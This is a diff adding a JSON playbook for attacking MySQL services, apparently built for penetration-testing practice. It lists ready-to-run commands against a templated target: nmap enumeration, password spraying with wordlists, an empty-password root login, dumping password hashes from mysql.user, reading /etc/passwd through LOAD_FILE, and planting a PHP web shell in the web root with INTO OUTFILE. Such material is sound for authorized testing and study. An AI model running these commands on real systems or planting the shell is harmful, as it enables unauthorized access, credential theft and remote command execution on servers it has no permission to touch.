@@ -1,0 +1,62 @@
+{
+  "service": "mysql",
+  "port": 3306,
+  "categories": [
+    {
+      "category": "1. Recon & Version Detection",
+      "tasks": [
+        {
+          "id": "mysql_nmap",
+          "title": "Nmap MySQL Enumeration",
+          "description": "Probe the service and run default enumeration scripts.",
+          "commands": [
+            "nmap -p 3306 -sV -sC {target_ip}",
+            "nmap --script mysql-enum,mysql-info,mysql-empty-password -p 3306 {target_ip}"
+          ]
+        },
+        {
+          "id": "mysql_spray",
+          "title": "Password Spraying (CME / NetExec)",
+          "description": "Spray user lists and wordlists against the MySQL daemon.",
+          "commands": [
+            "netexec mysql {target_ip} -u root -p '' --local-auth",
+            "netexec mysql {target_ip} -u users.txt -p '/home/kali/Desktop/OSCP/Tools/Password cracking/jonspass.txt' --local-auth"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "2. Authentication & Data Extraction",
+      "tasks": [
+        {
+          "id": "mysql_cli_connect",
+          "title": "MySQL CLI Connection",
+          "description": "Direct interactive connection via the MySQL client. Note: omit space between -p and the password.",
+          "commands": [
+            "mysql -u root -h {target_ip} -p<password> --skip-ssl",
+            "mysql -u root -h {target_ip} --skip-ssl"
+          ]
+        },
+        {
+          "id": "mysql_basic_queries",
+          "title": "Schema & User Dumping",
+          "description": "Common SQL enumeration commands once an interactive prompt is established.",
+          "commands": [
+            "SHOW DATABASES;",
+            "USE <database_name>; SHOW TABLES;",
+            "SELECT user, authentication_string, host FROM mysql.user;"
+          ]
+        },
+        {
+          "id": "mysql_file_read_write",
+          "title": "File Read / Write via SQL",
+          "description": "Read system files or write web shells if secure_file_priv allows it.",
+          "commands": [
+            "SELECT LOAD_FILE('/etc/passwd');",
+            "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';"
+          ]
+        }
+      ]
+    }
+  ]
+}
